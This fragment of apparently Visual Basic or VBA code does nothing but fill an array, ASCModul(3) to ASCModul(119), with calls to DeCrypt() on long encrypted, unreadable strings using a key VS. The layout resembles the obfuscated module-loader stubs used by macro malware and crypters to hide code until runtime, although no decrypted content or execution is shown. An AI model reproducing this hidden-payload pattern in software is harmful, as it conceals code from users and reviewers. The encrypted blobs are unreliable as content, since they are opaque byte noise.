  ASCModul(3) = DeCrypt("¢Ã¨÷’èÉËÒÞ²‘ÊÕŽÌøúÒƒÓè�ø‹ºæòæþè¤¾¬ëòÓëš½’ãÖú¶â‘€¿ÿí™Åÿ”›®ÚÄÓöÁÑé", VS)
  ASCModul(4) = DeCrypt("·ç«±ˆüìÓåâ£‹û§ˆÎþÛ‚‰ØÖ…ÇÜÄÊÒ¶ë¼Òò•ÜÑÓ®¼¨¯âôî•Å·ÚúÜÜ¨“œ€ÀúÓÆÀ‡Õ“Ù", VS)
  ASCModul(5) = DeCrypt("ö¹¾ÿ�ƒùùÃÝº­ÏÐóÊìøþ¡àÅ°‹’‡ß÷íí™ãÀ˜ÜÑ¿¥™Ž®µÕ�ë¢‘Ÿ¨Ü¼®áý�ˆ¦Î³Â˜Ž”Þ", VS)
  ASCModul(6) = DeCrypt("ÿê¬í–ßÍñÔ¼ª³Ùú«ûÞéÆ¦†ê�÷’¥âÖÏë›ðçÓëôöÔ�”¬Òª—ë¾˜¸˜‡ÇßÏœ›¿±Ý¸êü‚šª", VS)
  ASCModul(7) = DeCrypt("©Ç¤íž�Ì�èÈ¶õæ¢£íú«ÕœàÈúÔÿ›ÄÆ»·•ÙÔ„û•Ãë¾«±Ýä�§ÝÝ€ �É®Áâü”ž§œÒ‚ŠËß", VS)
  ASCModul(8) = DeCrypt("§û¸Ú…›êØæü¼óÄùýÓÌøø¹ÕÉºÚÄÀãòºè™àÀÓÄ‹ÐÌ¨¼§ÒìÓ‚ë»¸§ñíœÑÈ•‘±Úµö€ÔúÜ", VS)
  ASCModul(9) = DeCrypt(" ÜÀù‘ƒ˜ÓÇÀ¿„ÑÖ»ØËÑÖƒ€ò”âŒ–øËÌûƒ£Á±åËë¶¾È²üû�«»—²�Ý½ªÓõ�Ÿ½ú©ÄäˆéË", VS)
  ASCModul(10) = DeCrypt("�ÓÞ¨“•–†èÊ�ôý¬Œþÿ©ê£Ä‘¦ëä±îóÍæ•ÙúÒãå÷Ä¾…Šõêì´Ç½ÞŒóþš’ù©®†«’ÊóŠÖï", VS)
  ASCModul(11) = DeCrypt("½ê—ïááâêÐô‘ æüÿ¬ÉÍéºðÙéýäšíëì»‡êì�ÓÞ¾ùµ›ºôàˆˆÎÝ²�ÐÃ£äÙô¸ŠÞÇãöéãÙ", VS)
  ASCModul(12) = DeCrypt("ŽÃªß‘íàÿÁÍ²‚ÉÕ‹ÛìØôÄ„ðíÔüµéÌÐä½ÔÔ¡ÔæÇÜ¬½‰ÅÄù�ÝÝŠŒñÆ­äÈ¯±ˆÞ“âôÜÅÑ", VS)
  ASCModul(13) = DeCrypt("ŒÓœÕ“ËÒñÇÎ²ŒÌÅúÕåËå¼óò¥ÙõŽþìËçéúÜ³ÈÖÈäÕ’ƒÐÐÈ‰Þ»ŸœàÎÜèû¿Ò›õÄÉûÐðÒ", VS)
  ASCModul(14) = DeCrypt("žè—×žÖ‘•Ï£Ü¡ÉÑ‡ØîþÃ§òÇòüõµêÖÊË¢üÜ‰ö“ÉçžÈ‡þò��÷�ß‚ÎøÛèÕ¿Î„åƒ’øÁÑ¯", VS)
  ASCModul(15) = DeCrypt("€èœ©ŸÖÒ‰Ïö€ôÇî¹­âãÃÜùÚ±„ò�Ø°Íõ¢¤Úšâ“É²Â¾‰ÆÄñ�Ç³©¨õÆ®îÈ�ºŽÎµáòêê·", VS)
  ASCModul(16) = DeCrypt("·Ó®ø‘íàüÂÝ¶�ÉÅ�ØìÈñª÷áƒòü¶êÆÃÞ˜××¡ÄãÄêŠµ‹ã÷—¸Ì±ÙˆõÊ¯æþ�½Šø¡áõê÷Ý", VS)
  ASCModul(17) = DeCrypt("�Ó®ß‘ô‘üÁë¾‚ÊÖ�Üèðõ“çñ›çè îÏËá”ÆØ�ÖöéÌŠ•™öÉú†Û¾ºõ÷Ú–þÁ‡ºˆÎŸòñÃÅÂ", VS)
  ASCModul(18) = DeCrypt("ˆûºóšÕÆÎËæ¢òÆþ©®âÍÀ¯äå”ôïÇÃÍÑãŸÆÃ¶ËüÑÛ�ž‘¶ÓÔšà–‡¬ãû–ÃçšË¯¬˜�ÒÔíÝ", VS)
  ASCModul(19) = DeCrypt("§ËŽÖ¹åÌõëü¼–äÎ«ÂÀÓÝŠÙÑ�ØÍ–ÊéóÄ¼âæ’Þ”òÿŒÌ½ÈìŽ·þ¢­µ×é¤Þâ¢²ûë ð†ßÀÀ", VS)
  ASCModul(20) = DeCrypt("ýÜ�ÿäÉíÔµÃ«®½¿ ê›ïø’Ž�–‚„�Í³©é£¼í¡ÐÂÇÌ¬»‰ÕÄú�Ü·ªŒåÎ®æî�¸ŠÞ±äöêëÜ", VS)
  ASCModul(21) = DeCrypt("�ÓºÙ’ÛÆôÃë…ìðÕ‰«èÈñ¨÷ñ‹öÿ¶æÂÀø„Ö×¡ÐæÇóŽ¾‰ÕÈü…Ü£®„àÎ«âÄŠ«‰­¶ÝòÂëá", VS)
  ASCModul(22) = DeCrypt("¨ÃˆË�ÜæÖóï¶‰Áî„É•Ûæ‚ÕÔ‡øûžú·¶Ü‰ëÓ˜öþÁô´‘ƒÇêÉŽÙ«Û‚ðàÚöŸž¿™ô”ìäîÒÌ", VS)
  ASCModul(23) = DeCrypt("™Ô¹É†�Éä×á½¨ÒÃ�ôÌÞÜšÕ“�‚Ù™Ï³ç× ÐòÔÂâîòˆ¶¡Ýðë«¸¡¾¡ÄîµÊõ½�¤©£ÉÇÊÇ÷", VS)
  ASCModul(24) = DeCrypt("¾óžç£›ò�ôþ–÷ýö¸ÙÚ¡ä­ÎÓ¤úÄ”ÙÔ²¶…Å¤”÷ý´ùŸ–ü¯ÕÔõø”‡ûÑù•Ÿ€˜Èòé–‘œÝÐ·", VS)
  ASCModul(25) = DeCrypt("ýõ®Ó‘ÛäÿÁä¶‡ÍÅ‹µìÉ÷Šýë‰òþžÂàÃäéÆÔ¦×óîÿ¦‘ãñã�¶º•˜©ÅùÕ–Î�°žëÅýçø�ö", VS)
  ASCModul(26) = DeCrypt("œ½µÆéþôÊÌù’¤ËÒ¸Íûÿ„�…�³ýÑ¼ßóËø°åúšóÂë¶Û‹ŒýîŽ÷Õ˜¾»�ùÇ�ü�ƒºÔ…öàÒÛú", VS)
  ASCModul(27) = DeCrypt("¡æ›ä’Éöìöú¿ìÉÝûÎÝþö­ðæƒñï¥ùÖÃÙ³¸âÓÛ”¿ïÙ¶®÷øÁ©Ä„ÇŒøÑ´ÃÅõ²¹î€üÐÿÓÌ", VS)
  ASCModul(28) = DeCrypt("—ý·÷ªþÍŽÈû¹™ßÖƒ×ßÍü¥ø�´ßØ–ÒöÔÙ“ëÿÓßí×¨‚Š�Ý¹Ž÷¼”œ��Æ¦É×ôÎƒþžŽÍ�Ïé", VS)
  ASCModul(29) = DeCrypt("žÇœé‘ëòß¶áÃóÌ£�õ�©ˆ³Ìó²‹Ô†Ý¬ø éÒÓ¶Ä‘þú™­™ìÊÝ¸ÛÂ¼œþïŽÆù•›¦¬¤ÿ˜ø•·", VS)
  ASCModul(30) = DeCrypt("ŽÖ¡±¥ÞöÄ¯û²ˆ¿¥š¯úÎçØïÔí×Ž¡Òæñ·…¤ã�ÃÈôò¡·°ìð€„Ä„Ú½ìÝ¼ÒÝ‡Œü°ÇîÄðÓê", VS)
  ASCModul(31) = DeCrypt("­åµî’œŽÊï¾¿¡¼õùÎ‚îô£ÎÅˆöÛÎÇÐðÞ¸¸Ó�åœüü�ÐŒ«Åþïú¶²›Çî«ˆè‰®¿ÑÉÈÂÔ“ñ", VS)
  ASCModul(32) = DeCrypt("ºæÜç¢ÙŠè¯û·§úåûóÿÏƒ¦Ã’´ÿÌ®ÁÂÓã°Á§˜þ”öÏ˜•±þÔÞ¨øÃ™þŸâÚÀÝãµò®ŸÈ˜ÌæÂ", VS)
  ASCModul(33) = DeCrypt("®§–ªèàÀÌÅ§Â�Òä²µÈËçÄ�Í°Ç’°ûíçØ©æû“õéÔÜÛÐ„ÎÊÁ÷þ”€•öÓ�ÑÎ¾Ÿäè´í†ÝØ×", VS)
  ASCModul(34) = DeCrypt("¹«Üø¤ôŽÈìíÄ°Ç¬˜Ñý×ùÞ€Ñ­Ã�¥øâÉØãæÒ² þÌÈ�Ê¤«èï­¾·±¨ö¾‹Êž  ‰ó¨Õ„ŽÐÎ", VS)
  ASCModul(35) = DeCrypt("ÿô˜©¡ëÒð¯ãË—ÂÒåÜæàŸ§áÊ³€Õ®�Óòõ¨ÐÏ�Éý±Ê��ãÍ®íƒøœÚôúØÙë™¡º£ÕˆÐÔãðÊ", VS)
  ASCModul(36) = DeCrypt("™ÿ˜êšà“•èøªµþî¿ëé¡ÑØûÉ±ÒöÀï³èØºÅý‘¨ÎÜå¡—�ÈÂö†¢¼™†ÙÆÇý÷‡’¾ÉÂèÿêëî", VS)
  ASCModul(37) = DeCrypt("€ª¾¨²êËÚõùœ»â»­Ëß©ÆßÆìíË÷“ÜÏºÜþ¸ý¶¤Ð²ø˜™»êèó·ã¾ªœØò„ëáüºþª‚”˜Ìãû", VS)
  ASCModul(38) = DeCrypt("˜ÊÝ­§ŸÂÏåÜ˜ðêâòÛÉ²ÒÄ÷î®ÁÇ”óËî÷—Ýæ×Üëô­��ðÒò—ëÝŸ¢§„Ý˜”š¯ÈýÉÄëÃ‰úÉ", VS)
  ASCModul(39) = DeCrypt("™È›èªãÛò¯ùÂöþÕ ÈÙÐÈ³×öšûˆØ“Æ°À°ªÂØÚ–±Ìˆ¸üà®Á³ôÅ™»üò˜ôå»’¯È¤ŠöõÎÏ", VS)
  ASCModul(40) = DeCrypt("ýâœç„ûØóö§Ä¶º¥³±Øüò‡ÂÍú�Ž›™Ìøéµõ¾§äÔëéØ§øêÔ�±ÇÇŒõñØŸÖ×‚�©ª�ŠŽ×‰¡", VS)
  ASCModul(41) = DeCrypt("—ÖÙÉ¼�ÂŒóö èëî»¨š¬Æ�àÈ“†Œ¿Å²ëÿ„æô¶ûý¾ÔÆ·ùðåà©ãžŽ·ìâŽÄÞ¾Àùé¤�âÐ‰¯", VS)
  ASCModul(42) = DeCrypt("º¹¹ïäƒÖÔÙß¹†¹íåàæàŸ§îÅ„å…Ÿìµ­ê†æÙ¥Çëãÿ˜›©îÆý–Ëº„…Ý¸›Éšç�²å‡ßœíäÔ", VS)
  ASCModul(43) = DeCrypt("÷è‰Ò¥‡ÀÎÎÈË„¾Æ«àßÉÔ˜‡�ñ‹ö�“ÆÉãµûä“Â—êå¡½»¯ÛÜ²Áª ûÀíßòé¹Ö ç�ÏØÉÀì", VS)
  ASCModul(44) = DeCrypt("ù¥›ðÿÛàë±í„±¹Î²¯èîÜƒ‚Ã´ãäÀß×ÎæƒÅÆ®×ðä¤Ü©ºéÑýøÞ¢˜©…³žÁåôÖäù¼ÇÆÒšÛ", VS)
  ASCModul(45) = DeCrypt("ùà‰ÆûÂ’ÜúßÜ¢Îà¦©ÙÜÁÄûÑíËß‘“Æ¶â£Üå•å•Çª¼ŒºüÕÀŽù¨ŽùÅã¹ýŸ­•ùÆ¡”çüÒÑ", VS)
  ASCModul(46) = DeCrypt("µÔ¤ç˜ÝÑÆØÖÜ‡ÜÆøìÙÿˆªÂ—­Õôƒý¬» ¥ýåÏÆÑÞè¤·¦ïéâ†¦–Ç¦ä³­ÑããÀ¡ë‚—ÕÌÀè", VS)
  ASCModul(47) = DeCrypt("ŠÅƒÿ†ÎÖÖôö—›ÒñÿÊúïç“ÚÂð×ñÆäáÆ¿¤òñËéÓÎå»…çóÀò¡ø¥¬«‚À�éÙ®•ºÔ‚Šöùïö", VS)
  ASCModul(48) = DeCrypt("÷¡—î³ÞŽÄùÞµì°ðùüœöÂ‰ò�µúØŸÃÐ©Á¼É¡³âæ÷û„–¿ðÂ×šÉ¾�”ú¸ºÁÂ®ÀŠþÉÐ†Íûõ", VS)
  ASCModul(49) = DeCrypt("¤è¢¨çÇ÷ù³À†±ðÐ½êÜÚÑ³‚Í±ÑÄ¥ØÎè»ˆ¸ò©£‹·ïßÉ©àãÉ‚áÀ™´ùýßÖ—º´àýÂÖÒÃ�¬", VS)
  ASCModul(50) = DeCrypt("�÷Ø×èåõ‡·è¹…§×°ëÛ²�³ÄÄ»„�“ÌôÔý¥ äŽèÕµ®»�²îÙ�–é¿ÐŸÍù©Ö˜Š�“Í¦òÁïÐÌ", VS)
  ASCModul(51) = DeCrypt("øÜžÐ¾èîÌâà—•º£»èåÍÆ¬óÕªÃÕ§ÏëÈÂ¨ç×³©—Õå¿¯ƒ«ìÌµè¤ž¡âæžþÈô²œèž�œ�Îý", VS)
  ASCModul(52) = DeCrypt("««Ü­—Î”è¯û·ªù¤øÉæãÙ³ì�ñ‚ë¼ž¶ØÖ˜þÏ–üü­ÕÂžºþ÷Ú“æÝŒ�æÞŽÕþý°©þ¿ïñéä³", VS)
  ASCModul(53) = DeCrypt("ö½«É¤”ØÑõ¹‚÷ùÐ’ÀáÚÕØØ‘Ž†å‚ÛÑÑÅ·§À´º�ÞÊ™™Ÿ¶°ïø¼–žæÍº¸ÞÖž€úÆ‰�Þ×ÄÔ", VS)
  ASCModul(54) = DeCrypt("ˆæÞèãàÔÚæà�‹¹ÐžÊÙÉÊ Çî´˜……çÒ÷þ°çåµ¨”ÊÊØ‘ŸÎì“ô¾Ê»¹à¼«Âù‹®ˆ«’Ã˜ØÎ·", VS)
  ASCModul(55) = DeCrypt("¹£¿è‚•”öÔÏÅªÒ­ À×¯ù˜ÅÄªôÖ´Ò¨ä½¡ª£‘Á–çÊ®Ëªå÷“ªþÀÑ¡âí™Ó€¿ÖüÑ”ÌÎéÔ ", VS)
  ASCModul(56) = DeCrypt("½ôŠï¦È“ûÔÞ¸ºú­ù±šÏâ“ó•¤öäŽÈÏ²ßšßÁ²¾é¾ü¾Í„âÏþ¶ìªŠâÇ¤‰Õžª­¤ò™ñÔ”šÙ", VS)
  ASCModul(57) = DeCrypt("Œä×ßãÖùÓíâÀ—Æ¬˜ôÏûÄ³ÕÙ¤Š…Æ˜Èñ¤˜ñ÷±¨îëèƒÍ»óÙÙ©ï„ž£ÇÀÛÄù¶È�Î˜�ðõêô", VS)
  ASCModul(58) = DeCrypt("¥Ñºô©øÙÐåÈ¦“Îá¥àäÔñ¸�ðúòË�Éá­Õ°ØíªËãêñ‰Ìþ÷âÕ©û”˜µ�ÒœïÄŸŸ†¨›ÃÒÎ“ ", VS)
  ASCModul(59) = DeCrypt("„÷£îääÈŽ¶¹‰ˆø¿�Ð•¶ý�ÙëöÂÍ¾ó¿÷Õ™éÿ�æêÜËŒœ©ïäï’é½‹¢çþ†ÖÉŠ’óÉÁÁÀˆ’Ô", VS)
  ASCModul(60) = DeCrypt("­þ‹úºÊ–òÌÔ¡èÉæû¨�ìÑ¡ÚÂ˜ò–Âüöí¤¸ÂÍÐÇ�Ä¤•Í£·Ë—³ùªºæó²«ˆÜºª‰ý’Ñ�ÈÈú", VS)
  ASCModul(61) = DeCrypt("¡ÜŠÈ¹çÍî²Üº¦à×�öú¬ÚºÛÕ´ãÚÅÛ¿ûû‡ÐÞ¤¦ðÖØ—™«îäÊ²ÚÂ‹ˆüçžŸÚþˆ¸Ï‰ëñÏ‰ú", VS)
  ASCModul(62) = DeCrypt("¬¥¹«±œ“î×ü ú¸ûáÑßÏ‰¹‡ëºÚåÀÚÉ÷íþ÷çª Õ°ëÕ¾›³ñÞŠÜ½‚¿ÁÓ�”œ­Î¢«¦òáÝÎÀ", VS)
  ASCModul(63) = DeCrypt("«½Šì¾ÈôÊöø¤±Ãùù¯ûËÁØÙ‘¦ßñ˜áÖ·¾¾Åº—ÕÌÎ¯Ü·šÝóÕšûÊ©ž‡ÓŠÑÝ­É…ª ÖôêúÐ", VS)
  ASCModul(64) = DeCrypt("™ÕÝ¯²œ˜Ó¯ÿ†‰ìâ°Ö•íàŽüõš†ëÅß¾µ ´áÞ�ÇÈÊ®º»ñ·²ì‘Þ¤Ž†‡ÇÕ’Î¾Ê�«Šî„�Ø·", VS)
  ASCModul(65) = DeCrypt("ŽÚŽï‡Ç–õúÞÄµýà™©ÌëÅ¼øæ”äßÂÆõÉÄè§íŒÖïÖÓÂ»øïê—©èÅž‹ìèŠÉÍù�òï�ßçüä¯", VS)
  ASCModul(66) = DeCrypt("ƒñŽ®èàòÍùû±•Þòýìå×Ô›Ù’¨Ë–¿™ñàöåÿÃ‹Ëóà¨»Ôþðäâóá…ÑúÑß´ë€©•¯ñ ‘ÚÍÍ®", VS)
  ASCModul(67) = DeCrypt("‰âÞÖžÎéÕÖÖ�¯ÆÅ�«ëßö�ÎØªâò˜ÄèíÎèÊ¥ÑÇÑÈÐ™‘ðò¹ùðåÆ­—Ú¤šÁä¸›…ó“ÑÃíÆ«", VS)
  ASCModul(68) = DeCrypt("üô™ü¡™×Éðþ¦•òû�ÿøñê§ýê—×ÛÀ˜¾³ùéÒãŒðÏ¾ÓÛ–ù¯õˆ²ë—ºô‡¤­ð€µÈ­Ï¦“âÎÃÀ", VS)
  ASCModul(69) = DeCrypt("¤÷™Í¾Éêñêù»•çù�ìÁªÖ�ÇÐ àÌÆ›ôÑþ§êç•àÜÍç�›ºâùôïú±‘üØê¾è�þ˜þ°Å“çÏú·", VS)
  ASCModul(70) = DeCrypt("ŽÛ«ÆžëñËóµ°†úÝüÖ××€šÄÔéÑˆ–Ó´î×ú£û„ç�ðñœ‡ŽàÏ€ºº„Û»ŒÅ¾ðŸ„Ë¦û�Ã‚ðëÉ", VS)
  ASCModul(71) = DeCrypt("¼ó—ð—ëÉÎ²Ø‘±ì»òÛ÷öÝ±Úò¶€ÄØ˜áïþ»ßó†Ëó¾ô§“’âµŽ­á‡¾©òÑŠ“Ã½£šóŠçüëï³", VS)
  ASCModul(72) = DeCrypt("–â—ÆˆÀùÓ±úÇ²¸Ü¦Íÿ ŸÄ÷á…ÀöÜÉÝÒÊ¨¼â”Ä•¿ûŸžþâÍÛ®ì�º«€æÞˆØ�Îäè³õáÉ•È", VS)
  ASCModul(73) = DeCrypt("¢æ–õ†ÉùÒõÖ…©íÂ¡¢ýÊþ£ýÙ§Ñö²™¨±¾èØ­—ã×ðØÜÔñ½µà³´ÆÃ—øãŸˆØˆŸ…ü’ýÂ�ñÐ", VS)
  ASCModul(74) = DeCrypt("…Áœø€˜ÏŠ÷ãœ¬úå…ÃæÒû ÷ê›†Í¾ÂÓÅ¸›øÌ¯ÕüÔ¶¯‹šÂóÊ˜æ½Ž¡ÁçÞÄ€ÿŒø¦–ßÅ×”ö", VS)
  ASCModul(75) = DeCrypt("»È…üˆÏìŠ¯û°”ÜååÒÞøÙ›âõöÇû¥Çþûú´ä£‰ëÂÜÇ‹´ã¼òì–ãÄ²æ‚»ÞëÌµˆºí…ÿÚÊ–ì", VS)
  ASCModul(76) = DeCrypt("ÿüƒ×â›˜�ÏúŠ�§â¬þßÛ�¸ýÄ÷‡ÙºÂÝéæµçï†¦ÐàÍÝË®ÝÑÝ°èË™�ìÝ ß˜¸”¸í¦ÕƒÝ×¯", VS)
  ASCModul(77) = DeCrypt("»ä–ê†”—ÎñÁ ¡å¤³¬Ÿ¶ƒ½ä÷°Ü„¸ØÒëü˜ÿÆ®Çüçéµ™ƒ¶óÍòÛ”¸‰Çé–Äç£œ­Ñ�ÖÍÂ� ", VS)
  ASCModul(78) = DeCrypt("ªñ–øçœõèã¼Ü•þÄ®õÃÁÑ‘ÐÄñåŒ…üãñ¹¥Ù £¦Ò²ë��‰µø‰ªÛ´‰‡ÐáÃæç§Ÿà¨¢ÀòÑÓò", VS)
  ASCModul(79) = DeCrypt("šú–¬›�ÛõòÂ‡›£¬¼µìÒö¼þ”ñÅí»›þÅ¾â×ó¯º�ð¤Ý™çÜã—�À–™µîÓ ”Ã´Áý¨”ËÎÎÔ³", VS)
  ASCModul(80) = DeCrypt("þÊ µžæÛôò¹šìàó£Èï¶ƒ‘Ã�úòç†�ôÒÜþö¾ˆ¤ëÈìÂŠñÀÂÝ¥Ú¡¢”ÚàˆÌûûˆ §³ÊÆðé¡", VS)
  ASCModul(81) = DeCrypt("–ª¾Õ›çêÿÃåšªïÕ¥õÂöñÒý˜ŒëÖ Ä¬Åä¹ÿ÷Õ¥È¾é›Ô‰«å—øéÀÙ—Ýþ‡Á–´¶ùæÄÌœ�•þ", VS)
  ASCModul(82) = DeCrypt("«óšÛàè÷î·Á†ºÂÓ¨ãçËÄ�þÂòýÙ»ÈÈîø§þý‹óÇó¨º§ÿö×�¤ï¶Ð¾‡¾‚×››�¤þŠ–ùƒ’é", VS)
  ASCModul(83) = DeCrypt("·â£Õ¹›ÇÓÖÛØ”úå’ÕÂíõÙ‡Òªß’€ïÖóæéÃÚ“©àË²Þ”úöÙé¦ï�„¯�Ü´Å÷¢­¥æ‰�ÕóÐÉ", VS)
  ASCModul(84) = DeCrypt("¡ÓÚ¯²Â÷ë³Á‚ðß¦»«”ýè�ÆÓ˜Ç……ç¨ÃÍ·ä¤Ñ÷–­ß�Í¼ðàË”õºŠŸÆÍªîÁµ›¦­„Ñ˜ÒÍè", VS)
  ASCModul(85) = DeCrypt("™ð–íàãÓñÊàÅ§Îç’ã�²êÙÔÃ¸Áå±€ÌØçŸ§ü•èô²Î¨Ðÿ±ÔôïÞ‡ÜƒƒêÚóßùŒ�Ï…ìÁƒò ", VS)
  ASCModul(86) = DeCrypt("›ôÜÿèœÌÒëâŸ¢ßÆ¾àØúÃ�ã‘ô�ø�à°ïê�ùÏ’ÂæÀÏ¿­�áäÙ†Ë´®ŒöÙ¾õþ�¬žÊ¥äñÚäò", VS)
  ASCModul(87) = DeCrypt("¾ùƒï�Æ–Ðè£†èæ¤¸ÊÝüÑ¾ÚÆ¡Âðšßí²Ã¦¤äµÝË­×‹”£¶®€‚ïÙÞüÖÆžÅø–¯øù¾œ„ŽÃ ", VS)
  ASCModul(88) = DeCrypt(" ú�ò¤Ÿ’ÆÏõ½õùõø­Ïáè�äòõéøÄÅôõé³Ëû¶©á³ÎØ�€âÒÀ¦ÁÊºþÍÆ•ˆâ¶·äè±æÅùšÌ", VS)
  ASCModul(89) = DeCrypt("äÛ€Ò´þÀÉùîÆ…»÷†£œÎÂ…�“ºÑØÄèâÚí¶Ä£ÏéÆÒñ‡Ô†ÝÕ÷ºÀ¥±¦ß ˜áëŽš¸ê‘ÿáÝå ", VS)
  ASCModul(90) = DeCrypt("¶§¶Ø¹”�ý´ú¤‹æÇ�Ù‚ýè˜ýÑ—êÒ…›ÓøØæûÇ²ÃðÃÛ«¹ŽÅÉ—òÔ™©žÃÚ½âþ…¸ˆè¥æøü—Þ", VS)
  ASCModul(91) = DeCrypt("€õ¾Ò‘ÛèüÁÍœ‰ÍÓŒÉÛ¬ÇŒú�—„Þ¤âÆíÆ„Åò¦ËÑ³«ž…¾Ð²Üšì³…›�Î¤êÞ¢¬ŠÔ´éôÍõü", VS)
  ASCModul(92) = DeCrypt("ýê©ý—þã�Êß€…ßðá¯™ª‡œŽÒ“Áé ÇýæÈ‡êÜ¦ßÓä¯£��Àùö¡Õ¼Ø—ìÁ¸Äèõ“ª¯²ÕÕü›ª", VS)
  ASCModul(93) = DeCrypt("•Êƒè´ÿ”ˆåáÇ¶Ñ¦óîýöÛªå×“âø¦âÆÁø„ÐÚ²¾ÁÃÜ¼³‰óÈú�Ì�¢ˆóÍ¿Ñš»ž‡¯¥’þ÷ÅÙ", VS)
  ASCModul(94) = DeCrypt("¡¡ºÐˆÛè‰ñ¼§§ìÎ³ëÛýÈ¥™òðÀÎ�Î±ÃÄ’ÅóÖØ–¶ÿ ¾úõãÂ¨ù½ß»Œá‚ÔÇ��˜Ó›àóêó¬", VS)
  ASCModul(95) = DeCrypt("­ùºÏ•îàÿ«Þš¤îø¥ÝôÁÀ¯ÝêšÐÿ ÒÏêú©û¢­ âÎêÚ¦üÏÏ�¸þœ‹¨ÓþŸ’ëã“™ï£—úþÒÌ", VS)
  ASCModul(96) = DeCrypt("þ¡˜Ý–ÇÈÿôÞ«¯ÃÎ§êÃîÔÛ†�íÙÒ”üÐËÊçÊÏ‚ûýÂøÙ®�åôŠ†õŠºÿòÏ§îÃ¨½€ýÆó�ýûê", VS)
  ASCModul(97) = DeCrypt("€Ú‡ý“•×ŠÔÉÀ•¼¢ºÝ×ÉÆ¤ð‹¥ÂÓ¥ùï¶»‚ãÁÙÖàîÖ…Ê¼ñªè°½¼¯Žùé¡ï÷¨¡�Û˜îƒÈöï", VS)
  ASCModul(98) = DeCrypt("ùÛÛÊŠ™Åñëä½«±à¼èçÈ„³™Æ£ê„ÏÃ¿çí“êÝ´ù•­²�½«¼Òü…Þ«šœ†Ï¨“„¦®ˆéÂÍüøûÔ", VS)
  ASCModul(99) = DeCrypt("½ã‚ë£žôîïë±—Éõˆ¢œèÅ�óÈõ…ùŽÙÈÊ¼‚ÖÁØãÞÀ²¢”™Ëïàðã—ÚœÝ»¯éÜ‰”²­˜ÀÙãÛÁ", VS)
  ASCModul(100) = DeCrypt("ŒÃžÐ¶Å’ÊµÊÂö±ð™Éù¬Ã²ÜÖµÂÍÇß¿Ïù‹ÐÃ×òíàêŠ§«õÊŽñüž«õÃÓƒŒù�«„ÊÛ—�ì”­", VS)
  ASCModul(101) = DeCrypt("œèˆùâËæÐÖý¾–¾ÍóÛûÿàºô˜ ÿìÁÆÒðéµÞÏ©Ëî­Ü”»¾ÓÙÈ†´¡€ý…ÏØžù Ÿø×ªöãÁ’¡", VS)
  ASCModul(102) = DeCrypt("¥ö™Ñ½Éçæëà��§ö£ïÉÜŸ­™è£‹ÚÏýÏÏÈ™Üó­ýÉ©åµÊ½«³ê˜þ‘ª¼ÀÅŽÉÀþž»Ç¹“†ùÐï", VS)
  ASCModul(103) = DeCrypt("¹¢¶ß‡ï×Ò¹Å™úßÑÿÐŸ¡€ŒÂêñØÖ¦ÈµãõŸàÚ¡ âÎÌÔÇ¡ÈÌÛ¦Ë�œ§Âé–Þüœ¸š°³ÉàÃËÖ", VS)
  ASCModul(104) = DeCrypt("¥à›ÈºàÉÚÏÂ¾ó§Ì½Âû©ÿ�þòªÀŽ�æïÎÃ„âºšëÌõÎ�¾�ÆÆö¦Ä¡†ŽÚÇ»ÏÜ�½Œü—íüãÐÓ", VS)
  ASCModul(105) = DeCrypt("£Ã•Ä¼ÜŠÌ°Íƒ’åã€Ý�î×ÒìÑ�×ì­€ääÃãÙÆ™ØþÌïœ�§è¶ü–è�ÑüÜè­æÈ…©äö˜“ûéáÿ", VS)
  ASCModul(106) = DeCrypt("úý¸ÎœËÎÏ°þ¾�ýâåîÝãÈ¥ýÑ�ËíÀØâÃ¾³¦ðØÂÃ³û¡ÔŽÖ°é£ïÅÛæç½–Íõ�·øôÛÖáÙ•é", VS)
  ASCModul(107) = DeCrypt("öè®î»ú’Ê±á…¥ðÛ£«ÔÊâ�Õç¡œÊ­ÿÏ×õ©ëÍµöÝéÌž¾�Êµ“ˆÜ¶¯½ßæÜžÄô»‘ë”ŠÁ÷Äà", VS)
  ASCModul(108) = DeCrypt("ªÿ¤«¦úÓÑ¹õºû±äþÙáÎÁ½Ì÷ˆþ� ÒöìÎ·ßð¹×“´ö´‹£÷·Þ•Ô‚¥†å³¸ÏÍùËž­¨ã�íÏÜ", VS)
  ASCModul(109) = DeCrypt("ýóÄè±õðçÈ£¦ˆòûˆÍøüê¥òÚ˜ãÞ�ãÊöøá ú£ûÑþÎ«º±Òçýöø¾»âøàš×Ö¸°“Ý•áÍö‘×", VS)
  ASCModul(110) = DeCrypt("ý¥¦÷´ÔùùÅÔÀ·òÆ«ÿÃÜ†€ùõ¤Þ‰Ø˜èÇÎ¨ªÛ‚ÓÃ¶É‡Î…ÇÛŽ¤ý£�„Ìáˆý›¶°˜õ�ÜÿÌÉ¯", VS)
  ASCModul(111) = DeCrypt("µ¦¸«ãÆÓ�ëü¼÷ÒÝ™ÖïÓÖ­ßøª‡è°�¨ûìµñ¬¶ÿÍÂçÔ�çÌöïŽÚ¾‚ž† ßÔÊš‹§Ëš—íÍõÍ", VS)
  ASCModul(112) = DeCrypt("¤ÿ–Í�ûŽÔÎÜ¾—áõ¡ßãÀÅ¼î–¶ÞúŸßîÛíºýïšúðèðÔÇŠ½çÉµáËÚúŸÏ•“Ç–ªƒð†ôïýõÙ", VS)
  ASCModul(113) = DeCrypt("› †ÓéáÕÇíÂÅ¹½¥§Ñ†Ñùºøâ”€�¾æ¬±é´«£´÷ãüÛ¢†€ü÷�„Ï‚ƒ€Ÿý¹–ù†�¹Ùß×ý�ÖÏ", VS)
  ASCModul(114) = DeCrypt("›ÙÜèšÆðÏôÂÆûºÝ»óèËÙ›Ýò­Ë��áÅòÇéáÿŒÚ”Ô¬Õš¿Ó¸Ñ–è¤�¦øÉ«íÇ¡¨¨Ë�•ãÓšÖ", VS)
  ASCModul(115) = DeCrypt("¡ûÜÓ¾œËŒâçÂ®ÉÜ“ÉÚ«È„…éòð�ŸìåÌ×çÐÌÒóåÈË‰™§òàÛôû™� ã¸…íÈ�¶‚®Á‘ãÃç³", VS)
  ASCModul(116) = DeCrypt("‚Ú–éåãËËÖ´ŸºýÍ¿øÏ­ã€Óä–ÙÏ˜ìÈ·ÿ™¥ÐŠåëïÌ¯¸ŠÆæê�ê³¯�åÂØÅÄ™¨ŠÞŸïòüäË", VS)
  ASCModul(117) = DeCrypt("¹§˜ùœœô‰åÙÃ‚æ¤’ã÷ûå€òé‰àï˜€î÷·ä÷§¦¢ôÉ¯Ùœ‰ÏÂÕø¹³»˜÷¸™æ–£ËŽæ¶ñðòêî", VS)
  ASCModul(118) = DeCrypt("Š¡ÙÉ…Ëœƒ", VS)
  ASCModul(119) = DeCrypt("òó¨ê‡", VS)
